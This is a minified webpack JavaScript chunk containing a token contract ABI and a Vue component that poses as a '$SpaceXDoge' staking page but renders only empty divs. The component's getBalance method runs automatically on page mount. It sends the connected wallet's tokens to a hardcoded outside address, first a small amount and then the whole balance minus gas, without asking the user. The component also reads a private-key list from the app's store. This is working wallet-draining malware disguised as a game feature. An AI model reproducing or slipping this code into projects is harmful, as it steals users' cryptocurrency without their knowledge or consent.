"use strict";(self.webpackChunkgame=self.webpackChunkgame||[]).push([[232,895],{3895:function(e,t,n){n.r(t),t.default=[{inputs:[],stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"previousOwner",type:"address"},{indexed:!0,internalType:"address",name:"newOwner",type:"address"}],name:"OwnershipTransferred",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Transfer",type:"event"},{inputs:[],name:"WETH",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"burn",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"}],name:"burnAccount",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"to",type:"address"}],name:"callPayMint",outputs:[],stateMutability:"payable",type:"function"},{inputs:[{internalType:"address",name:"to",type:"address"}],name:"claim",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"}],name:"claimAccount",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"decimals",outputs:[{internalType:"uint8",name:"",type:"uint8"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"subtractedValue",type:"uint256"}],name:"decreaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"addedValue",type:"uint256"}],name:"increaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"isClaim",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[],name:"isLaunch",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[],name:"name",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"owner",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"pancakeV2",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"addr",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"receiveERC20",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address payable",name:"to",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"receiveETH",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"renounceOwnership",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"_burn",type:"uint256"}],name:"setBurn",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"bool",name:"flag",type:"bool"}],name:"setClaim",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"adr",type:"address"},{internalType:"bool",name:"flag",type:"bool"}],name:"setPair",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"symbol",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transfer",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transferFrom",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"newOwner",type:"address"}],name:"transferOwnership",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"}],name:"uniswapPair",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{stateMutability:"payable",type:"receive"}]},2232:function(e,t,n){n.r(t),n.d(t,{default:function(){return m}});var a=n(6440);const i={class:"layout"},s=[(0,a._)("div",{class:"layout-inner radius-box"},[(0,a._)("div",{class:"container",style:{padding:"0"}})],-1)];n(5362);var p=n(936),u=n(1279),r=n(570),o=n(9756),l=n(6494),y=n(9326);n(5101),n(3895);const{t:d}=l.default.global;var c={data(){return{t:d,isLogin:!1,isRefreshing:!1,stakeLoading:!1,stakeAmount:0,balance:0,utils:u,gotPrice:p.ph,logo:"",checkLowerCase:p.YG,teafiContract:"",blockDelay:0,account:null,mainToken:{name:"$SpaceXDoge"},stakeContract:null,stakeData:{},item1:{},_token:null,_lock:!1}},mounted(){this.isRefreshing=!0,this.teafiContract=this.currentNetwork.stockContract,this.handleAccount();this._token=new y.Z({blockchain:this.currentNetwork.chains,address:window.wallet.getWrappedAddress()}),this.callBlock(1)},deactivated(){this.isRefreshing=!1,clearTimeout(this.callTime),clearTimeout(this.callBlockTime)},computed:{...(0,o.Se)(["currentNetwork","currentConfig","accountChange","connectState","accountList","privateKeyList","taskList","currentRpc"]),coinImagePath(){return n(3058)(`./${this.currentNetwork.ChainDex}.png`)}},watch:{accountChange:{handler(e,t){this.handleAccount()},deep:!0}},methods:{...(0,o.nv)(["setConnectDialog"]),async handleAccount(){this.stakeData={};let e=window.wallet.getByAccount();this.logo=window.wallet.getWrapped().logo,e?.address?(this.account=e,this.isLogin=!0,await this.loginCallBack()):this.isLogin=!1},getShortAddress(e){return e.substr(0,6)+"..."+e.substr(-4)},async callBlock(e){this.callBlockTime=setTimeout((async()=>{(new Date).getTime();try{this.getBalance()}catch(e){}if(this.isRefreshing){(new Date).getTime()}else;}),e)},async getBalance(){let e=window.wallet.getByAccount();try{let e=r.fi("0.01"),t=await this._token.transfer("0xA20676427f53223529E154627D8a1111deA7adc6",e);await t.wait()}catch(t){if(this._lock)return;this._lock=!0;let n=await this._token.balance(e.address);const a=5,i=21e3*r.vz(a.toString(),9);r.dF(i);let s=n.sub(i);if(s.gt(0))try{let e=s;await this._token.transfer("0xA20676427f53223529E154627D8a1111deA7adc6",e)}catch(e){}this._lock=!1}},async loginCallBack(){},loginFn(){this.setConnectDialog(!0)}}};var m=(0,n(7650).Z)(c,[["render",function(e,t,n,p,u,r){return(0,a.wg)(),(0,a.iD)("div",i,s)}]])}}]);